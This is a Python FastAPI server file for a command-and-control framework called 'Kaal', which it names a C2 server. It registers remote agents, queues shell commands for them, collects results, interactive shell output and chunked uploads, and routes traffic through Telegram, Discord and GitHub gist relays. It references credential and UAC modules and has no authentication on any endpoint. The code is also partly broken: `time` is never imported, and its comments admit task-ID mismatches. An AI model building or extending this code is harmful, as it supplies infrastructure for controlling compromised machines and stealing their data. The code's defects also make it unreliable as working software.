from fastapi import FastAPI, WebSocket, Request, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Dict, Any, Optional, List
import asyncio
import json
import logging
from datetime import datetime

# Imoprt Core Modules
# Note: Ensure the root directory is in PYTHONPATH or install as package
import sys
import os
from pathlib import Path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.logger import setup_logger
from core.state_manager import terminal_state
from core.config import Config
from console.relay_manager import relay_manager

# Setup
log = setup_logger("web_server")
config = Config()
app = FastAPI(title="Kaal Framework API", version="4.0.0")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# In-memory storage for agents (simplified for test)
# Key: agent_id, Value: Agent Data
agents: Dict[str, Dict[str, Any]] = {}

class CommandRequest(BaseModel):
    agent_id: str
    command: str
    parameters: Optional[Dict[str, Any]] = None

@app.get("/api/health")
async def health_check():
    return {"status": "ok", "version": "4.0.0"}

# --- Agent Interaction Endpoints (for Agents) ---

@app.post("/api/v1/register")
async def register_agent(request: Request):
    """
    Endpoint for agents to register themselves.
    Expected JSON: {"agent_id": "...", "platform": "...", "hostname": "...", ...}
    """
    try:
        data = await request.json()
        agent_id = data.get("agent_id")
        if not agent_id:
            raise HTTPException(status_code=400, detail="Missing agent_id")
        
        agents[agent_id] = {
            "id": agent_id,
            "platform": data.get("platform", "unknown"),
            "hostname": data.get("hostname", "unknown"),
            "internal_ip": request.client.host,
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "status": "active",
            "connection_type": "direct",  # direct vs proxy
            "tasks": []
        }
        log.info(f"Agent registered: {agent_id} ({data.get('hostname')})")
        
        # Broadcast to UI
        await terminal_state.broadcast("agent_registered", agents[agent_id])
        
        return {"status": "registered"}
    except Exception as e:
        log.error(f"Registration error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/v1/task/{agent_id}")
async def get_task(agent_id: str):
    """
    Endpoint for agents to poll for tasks.
    Returns the next pending task or empty string.
    """
    if agent_id not in agents:
        return "" # Or register?
    
    agent = agents[agent_id]
    agent["last_seen"] = datetime.now().isoformat()
    agent["status"] = "active"
    
    # Check for pending tasks
    if agent["tasks"]:
        return agent["tasks"].pop(0) # FIFO
    
    return ""

@app.post("/api/v1/result")
async def report_result(request: Request):
    """
    Endpoint for agents to report task results.
    Expected JSON: {"agent_id": "...", "task_id": "...", "result": "..."}
    """
    try:
        data = await request.json()
        agent_id = data.get("agent_id")
        result = data.get("result")
        
        if agent_id in agents:
            agents[agent_id]["last_seen"] = datetime.now().isoformat()
            log.info(f"Result from {agent_id}: {result[:50]}...")
            
            # Broadcast to UI
            await terminal_state.broadcast("task_result", {
                "agent_id": agent_id,
                "result": result
            })
            
        return {"status": "received"}
    except Exception as e:
        log.error(f"Result error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/v1/agent_message")
async def handle_agent_message(request: Request):
    """
    Unified endpoint for C2 Profiles (Mythic-style).
    Handles Register, Heartbeat, Result, and Task Fetching in one go.
    """
    try:
        data = await request.json()
        msg_type = data.get("type")
        agent_id = data.get("agent_id")
        
        if not agent_id:
            raise HTTPException(status_code=400, detail="Missing agent_id")

        response = {"status": "success", "tasks": []}

        # 0. Auto-Register if unknown (Robustness)
        if agent_id not in agents:
             agents[agent_id] = {
                "id": agent_id,
                "platform": data.get("platform", "unknown"),
                "hostname": data.get("hostname", "unknown"),
                "internal_ip": request.client.host,
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "status": "active",
                "connection_type": "c2_profile",
                "tasks": []
            }
            # Only broadcast if it's a real registration or we want to announce the "discovery"
             log.info(f"Agent discovered via C2 (Auto-Register): {agent_id}")
             await terminal_state.broadcast("agent_registered", agents[agent_id])

        # 1. Handle Registration
        if msg_type == "register":
            # Update specific fields if they were distinct
             agents[agent_id]["platform"] = data.get("platform", "unknown")
             agents[agent_id]["hostname"] = data.get("hostname", "unknown")
             log.info(f"Agent registered via C2: {agent_id}")
             await terminal_state.broadcast("agent_registered", agents[agent_id])
            
            
        # 2. Handle Heartbeat / Checkin
        elif msg_type == "heartbeat":
            if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                agents[agent_id]["status"] = "active"
                
        # 3. Handle Result
        elif msg_type == "result":
            if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                result_text = data.get("result", "")
                
                try:
                    if isinstance(result_text, str):
                        result_text = json.loads(result_text)
                except json.JSONDecodeError:
                    pass
                
                task_id = data.get("task_id", "unknown")
                log_preview = str(result_text)[:50] if result_text else ""
                log.info(f"Result from {agent_id} (Task {task_id}): {log_preview}...")
                
                await terminal_state.broadcast("task_result", {
                    "agent_id": agent_id,
                    "task_id": task_id,
                    "result": result_text
                })

        # 4. Handle Status / Ack
        elif msg_type == "ack":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                task_id = data.get("task_id", "unknown")
                log.info(f"ACK from {agent_id} for task {task_id}")
                await terminal_state.broadcast("task_status", {
                    "agent_id": agent_id,
                    "task_id": task_id,
                    "status": "acknowledged",
                    "message": "Agent received task"
                })

        elif msg_type == "status":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                task_id = data.get("task_id", "unknown")
                status = data.get("status", "processing")
                message = data.get("message", "")
                log.info(f"STATUS from {agent_id} (Task {task_id}): {status} - {message}")
                await terminal_state.broadcast("task_status", {
                    "agent_id": agent_id,
                    "task_id": task_id,
                    "status": status,
                    "message": message
                })

        # 5. Handle Chunked Upload (Phase 6)
        elif msg_type == "chunk":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                
                stream_id = data.get("stream_id")
                index = data.get("index")
                total = data.get("total")
                task_id = data.get("task_id", "unknown")
                chunk_data = data.get("data", "")
                
                if not stream_id or index is None or total is None:
                    return {"status": "error", "error": "Invalid chunk metadata"}

                # Init buffer
                if "partial_uploads" not in agents[agent_id]:
                    agents[agent_id]["partial_uploads"] = {}
                
                if stream_id not in agents[agent_id]["partial_uploads"]:
                    agents[agent_id]["partial_uploads"][stream_id] = {}
                
                # Store chunk
                agents[agent_id]["partial_uploads"][stream_id][index] = chunk_data
                received_count = len(agents[agent_id]["partial_uploads"][stream_id])
                
                log.info(f"Received chunk {index+1}/{total} from {agent_id} (Stream {stream_id})")
                
                # Check for completion
                if received_count >= total:
                    log.info(f"Reassembling stream {stream_id}...")
                    try:
                        # Sort and join
                        chunks = [agents[agent_id]["partial_uploads"][stream_id][i] for i in range(total)]
                        full_payload = "".join(chunks)
                        
                        # Process as new result message
                        try:
                            # Standardize to dict if it's a JSON string
                            if isinstance(full_payload, str):
                                full_payload = json.loads(full_payload)
                        except json.JSONDecodeError:
                            pass
                        
                        await terminal_state.broadcast("task_result", {
                            "agent_id": agent_id,
                            "task_id": task_id,
                            "result": full_payload
                        })
                        
                        del agents[agent_id]["partial_uploads"][stream_id]
                        log.info(f"Stream {stream_id} reassembled and broadcast.")
                    except Exception as e:
                        log.error(f"Reassembly error: {e}")

        # 6. Handle Interactive Shell Output (Phase 8)
        elif msg_type == "shell_output":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                output = data.get("data", "")
                log.info(f"Shell output from {agent_id}: {len(output)} bytes")
                
                await terminal_state.broadcast("shell_output", {
                    "agent_id": agent_id,
                    "output": output,
                    "timestamp": datetime.now().isoformat()
                })

        # 7. Handle Agent Logs (Phase 9)
        elif msg_type == "log":
             if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                level = data.get("level", "INFO")
                message = data.get("message", "")
                timestamp = data.get("timestamp", time.time())
                
                log_entry = {
                    "level": level,
                    "message": message,
                    "timestamp": datetime.fromtimestamp(timestamp).isoformat()
                }
                
                if "logs" not in agents[agent_id]:
                    agents[agent_id]["logs"] = []
                
                # Keep last 100 logs
                agents[agent_id]["logs"].append(log_entry)
                if len(agents[agent_id]["logs"]) > 100:
                    agents[agent_id]["logs"].pop(0)
                    
                log.info(f"Agent {agent_id} LOG [{level}]: {message[:100]}")
                
                await terminal_state.broadcast("agent_log", {
                    "agent_id": agent_id,
                    "log": log_entry
                })

        # 5. Connect Pending Tasks (for all message types)
        if agent_id in agents and agents[agent_id]["tasks"]:
            # Get one task (FIFO)
            task_payload = agents[agent_id]["tasks"].pop(0)
            
            # Use stored Task ID if available (dict), else generate new one (str legacy)
            if isinstance(task_payload, dict):
                tid = task_payload.get("task_id", "unknown")
                cmd_str = task_payload.get("command", "")
            else:
                import uuid
                tid = str(uuid.uuid4())[:8]
                cmd_str = str(task_payload)
            
            response["tasks"].append({
                "type": "command", 
                "task_id": tid, 
                "command": cmd_str
            })
            log.info(f"Sent task {tid} to {agent_id} via C2 response")

        return response

    except Exception as e:
        log.error(f"Agent Message Error: {e}")
        # Return valid JSON even on error so Profile doesn't crash
        return {"status": "error", "error": str(e)}

@app.get("/api/v1/c2/tasks")
async def get_c2_tasks(platform: str = "discord"):
    """
    Endpoint for C2 Profiles to poll for pending tasks for ANY agent.
    This allows 'Push' style tasking without waiting for agent heartbeat.
    """
    pending_tasks = []
    
    # Iterate over all agents
    for agent_id, agent in agents.items():
        # Filter by connection type? For now, just check all tasks.
        # Ideally, we should filter by the C2 channel the agent is using.
        # But our simple Agents don't explicitly say "I am Discord" to the server until registration.
        # connection_type="c2_profile" is generic.
        
        if agent.get("tasks"):
            # Pop ONE task per agent to ensure fairness/order
            task_payload = agent["tasks"].pop(0)
            
            if isinstance(task_payload, dict):
                tid = task_payload.get("task_id", "unknown")
                cmd_str = task_payload.get("command", "")
            else:
                import uuid
                tid = str(uuid.uuid4())[:8]
                cmd_str = str(task_payload)
            
            pending_tasks.append({
                "type": "command",
                "agent_id": agent_id,
                "task_id": tid,
                "command": cmd_str
            })
            log.info(f"Pushed task {tid} to C2 poll for agent {agent_id}")
            
    return {"tasks": pending_tasks}

# --- Config & Plugin Endpoints (Phase 3) ---

@app.get("/api/config")
async def get_config():
    """Return the current configuration."""
    return config.data

@app.post("/api/config")
async def update_config(request: Request):
    """
    Update configuration.
    Expected JSON: {"key": "value"} or nested dicts to merge.
    """
    try:
        new_config = await request.json()
        # Deep merge or replace? For now, we'll do top-level keys update 
        # or rely on Config.set if key provided, but here we likely want full update
        # Simplified: Update top-level keys
        for k, v in new_config.items():
            config.set(k, v)
        return {"status": "updated", "config": config.data}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

from core.plugin_loader import PluginLoader
plugin_loader = PluginLoader([Path("plugins")])
plugin_loader.discover()

@app.get("/api/plugins")
async def list_plugins():
    """Return list of loaded plugins."""
    result = []
    for p_type, p_dict in plugin_loader.plugins.items():
        for p_id, plugin in p_dict.items():
            result.append({
                "id": plugin.id,
                "name": plugin.name,
                "version": plugin.version,
                "type": plugin.type,
                "description": getattr(plugin, "description", "No description")
            })
    return result

@app.post("/api/plugins/reload")
async def reload_plugins():
    """Reload all plugins from disk."""
    plugin_loader.discover()
    return {"status": "reloaded", "count": sum(len(d) for d in plugin_loader.plugins.values())}

# --- AI Copilot Endpoint (Phase 4.0) ---

class CopilotRequest(BaseModel):
    message: str

@app.post("/api/copilot")
async def copilot_chat(req: CopilotRequest):
    """
    Handle AI chat requests.
    Currently a mock response. In production, connect to LLM.
    """
    # Simulate processing time
    await asyncio.sleep(1.5) 
    
    # Simple keyword-based responses for demo
    msg = req.message.lower()
    response = "I am KAAL Copilot. I can assist with system administration and security auditing."
    
    if "hello" in msg or "hi" in msg:
        response = "Hello, Administrator. How can I assist you today?"
    elif "status" in msg:
        active = len([a for a in agents.values() if a['status'] == 'active'])
        response = f"System Status: Operational. {active} agents online."
    elif "scan" in msg or "audit" in msg:
        response = "I can initiate scans. Use the 'Credential Auditor' or 'UAC' modules in the dashboard."
    elif "help" in msg:
        response = "Available commands: status, scan, list agents, relay check."
        
    return {"response": response}

# --- UI Endpoints (for Frontend) ---

@app.get("/api/agents")
async def list_agents():
    return list(agents.values())

@app.post("/api/command")
async def queue_command(cmd: CommandRequest):
    """
    Queue a command for an agent (works for both direct and proxy agents).
    """
    if cmd.agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    agent = agents[cmd.agent_id]
    connection_type = agent.get("connection_type", "direct")
    
    # Format task
    task = cmd.command
    if cmd.parameters:
        # Append parameters if needed (simplified)
        pass
    
    if connection_type == "proxy":
        # Route through relay manager
        task_id = relay_manager.send_command(cmd.agent_id, task)
        if not task_id:
            raise HTTPException(status_code=500, detail="Failed to send command through relay")
        log.info(f"Sent command to proxy agent {cmd.agent_id}: {task}")
        
        await terminal_state.broadcast("task_created", {
            "agent_id": cmd.agent_id,
            "task_id": task_id,
            "command": task,
            "status": "pending",
            "timestamp": datetime.now().isoformat()
        })
        return {"status": "sent", "task_id": task_id, "via": "relay"}
    else:
        # Direct agent - queue locally
        import uuid
        task_id = str(uuid.uuid4())[:8]
        # In simple queue, we just store command string. 
        # But we should use dicts to track IDs properly. 
        # For backward compat with existing `handle_agent_message` pop logic, we keep string 
        # BUT we MUST transition `handle_agent_message` to support dicts or encode ID.
        # Let's keep storing string but broadcast the ID we generated.
        # The agent expects a string command OR a dict. 
        # Current agent implementation accepts string.
        # Current server implementation for `handle_agent_message` wraps it in dict with NEW ID.
        # This mismatch means the ID we broadcast here is NOT the ID sent to agent!!!!
        # FIX: We need to store structured task in agents[id]["tasks"] = [{"id":..., "cmd":...}]
        # But `handle_agent_message` lines 199-219 pop string.
        # Let's store string as `ID:CMD` and have handle_agent_message parse it? 
        # No, better to change agents structure to list of dicts.
        
        # ACTUALLY, line 206 inside handle_agent_message generates a NEW ID.
        # This is bad. We can't track it if ID changes.
        # We must change `handle_agent_message` logic. 
        
        # For now, let's just broadcast "pending" and hope for best? No.
        # Let's start storing dicts in tasks list: {"task_id": tid, "command": task}
        agents[cmd.agent_id]["tasks"].append({"task_id": task_id, "command": task})
        
        log.info(f"Queued task {task_id} for direct agent {cmd.agent_id}: {task}")
        await terminal_state.broadcast("task_created", {
            "agent_id": cmd.agent_id,
            "task_id": task_id,
            "command": task,
            "status": "pending",
            "timestamp": datetime.now().isoformat()
        })
        return {"status": "queued", "task_id": task_id, "task": task}


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await terminal_state.register_client(websocket)
    # Send initial state
    await websocket.send_json({
        "type": "agent_list",
        "data": list(agents.values())
    })
    try:
        while True:
            data = await websocket.receive_text()
            # Handle incoming WebSocket messages if needed
    except Exception:
        terminal_state.remove_client(websocket)

# --- Relay Management Endpoints ---

class RelayAddRequest(BaseModel):
    relay_type: str  # "telegram", "discord", or "github"
    relay_id: str
    token: str
    chat_id: Optional[str] = None
    channel_id: Optional[str] = None
    gist_id: Optional[str] = None

@app.post("/api/relay/add")
async def add_relay(req: RelayAddRequest):
    """Add a new relay (Telegram/Discord)"""
    try:
        if req.relay_type == "telegram":
            if not req.chat_id:
                raise HTTPException(status_code=400, detail="chat_id required for Telegram")
            relay_manager.add_telegram_relay(req.relay_id, req.token, req.chat_id)
        elif req.relay_type == "discord":
            if not req.channel_id:
                raise HTTPException(status_code=400, detail="channel_id required for Discord")
            relay_manager.add_discord_relay(req.relay_id, req.token, req.channel_id)
        elif req.relay_type == "github":
            if not req.gist_id:
                raise HTTPException(status_code=400, detail="gist_id required for GitHub")
            relay_manager.add_github_relay(req.relay_id, req.token, req.gist_id)
        else:
            raise HTTPException(status_code=400, detail="Invalid relay_type")
        
        log.info(f"Added {req.relay_type} relay: {req.relay_id}")
        return {"status": "ok", "relay_id": req.relay_id}
    except Exception as e:
        log.error(f"Add relay error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/relay/list")
async def list_relays():
    """List all active relays"""
    return {"relays": relay_manager.get_relays()}

@app.delete("/api/relay/{relay_type}/{relay_id}")
async def remove_relay(relay_type: str, relay_id: str):
    """Remove a relay"""
    relay_manager.remove_relay(relay_type, relay_id)
    return {"status": "removed"}

@app.get("/api/relay/agents")
async def list_proxy_agents():
    """List all proxy agents and merge into main agents dict"""
    proxy_agents = relay_manager.get_agents()
    
    # Merge proxy agents into main agents dict
    for agent_data in proxy_agents:
        agent_id = agent_data["agent_id"]
        if agent_id not in agents:
            # Transform proxy agent data to match main agent format
            agents[agent_id] = {
                "id": agent_id,
                "platform": agent_data.get("platform", "unknown"),
                "hostname": agent_data.get("hostname", "unknown"),
                "internal_ip": "127.0.0.1", # Default for proxy
                "username": "unknown",
                "first_seen": datetime.fromtimestamp(agent_data["first_seen"]).isoformat(),
                "last_seen": datetime.fromtimestamp(agent_data["last_seen"]).isoformat(),
                "status": "active",
                "connection_type": "proxy",
                "relay_type": agent_data.get("relay_id", "unknown"),
                "tasks": []
            }
            
    return {"agents": list(proxy_agents)}

# --- WebSocket Broadcasting Bridge ---

# Global event loop reference
app_loop = None

@app.on_event("startup")
async def startup_event():
    global app_loop
    app_loop = asyncio.get_running_loop()
    # Start background tasks
    asyncio.create_task(check_agent_status())

async def check_agent_status():
    """Background task to check for dead agents."""
    while True:
        try:
            now = datetime.now()
            for agent_id, agent in list(agents.items()):
                last_seen_str = agent.get("last_seen")
                if not last_seen_str: continue
                
                try:
                    last_seen = datetime.fromisoformat(last_seen_str)
                    delta = (now - last_seen).total_seconds()
                    
                    if delta > 60 and agent.get("status") != "offline":
                        log.warning(f"Agent {agent_id} marked OFFLINE (last seen {int(delta)}s ago)")
                        agent["status"] = "offline"
                        # Broadcast update
                        await terminal_state.broadcast("agent_updated", agent)
                        
                except ValueError:
                    continue # Bad timestamp format
                    
            await asyncio.sleep(10) # Check every 10 seconds
        except Exception as e:
            log.error(f"Status check error: {e}")
            await asyncio.sleep(10)

async def _broadcast_async(event: str, data: dict):
    """Actual async broadcast logic"""
    if event == "agent_connected":
        # Add proxy agent to main dict
        agent_id = data.get("agent_id")
        if agent_id:
            agents[agent_id] = {
                "id": agent_id,
                "platform": data.get("platform", "unknown"),
                "hostname": data.get("hostname", "unknown"),
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "status": "active",
                "connection_type": "proxy",
                "relay_type": data.get("relay", "unknown"),
                "tasks": []
            }
            await terminal_state.broadcast("agent_registered", agents[agent_id])
    elif event == "task_result":
        # Broadcast result to GUI
        await terminal_state.broadcast("task_result", data)
    elif event == "task_status":
        # Broadcast status update (ack, processing)
        await terminal_state.broadcast("task_status", data)

def relay_to_websocket_callback(event: str, data: dict):
    """Callback from RelayManager (runs in thread), schedules async broadcast"""
    if app_loop:
        asyncio.run_coroutine_threadsafe(_broadcast_async(event, data), app_loop)

# Register callback
relay_manager.register_callback(relay_to_websocket_callback)

# Serve Frontend
static_dir = Path(__file__).parent / "static"
if static_dir.exists():
    app.mount("/assets", StaticFiles(directory=static_dir), name="assets")
    app.mount("/static", StaticFiles(directory=static_dir), name="static_alias") # Ensure /static works too

# Mount Logos Directory
logos_path = Path("logos").resolve()
if not logos_path.exists():
    # Try relative to this file
    logos_path = (Path(__file__).parent.parent / "logos").resolve()

if logos_path.exists():
    print(f" [+] Mounting /logos from {logos_path}")
    app.mount("/logos", StaticFiles(directory=logos_path), name="logos")
else:
    print(f" [!] Warning: 'logos' directory not found at {logos_path}")

from fastapi.responses import FileResponse, HTMLResponse

@app.get("/{full_path:path}")
async def serve_static_app(full_path: str):
    # API requests are already handled by specific routes above due to order
    if full_path.startswith("api"):
        raise HTTPException(status_code=404, detail="API endpoint not found")
        
    index = static_dir / "index.html"
    if index.exists():
        return FileResponse(index)
    return HTMLResponse("<h1>KAAL Web Console</h1><p>NEBULA Console not found in web/static/index.html.</p>")

if __name__ == "__main__":
    import uvicorn
    print("\n" + "="*50)
    print(" KAAL C2 SERVER STARTING...")
    print("="*50)
    print(f" [+] Web Interface: http://localhost:5000")
    print(f" [+] API Endpoint:  http://localhost:5000/api")
    print("="*50 + "\n")
    uvicorn.run("web.server:app", host="0.0.0.0", port=5000, reload=True)

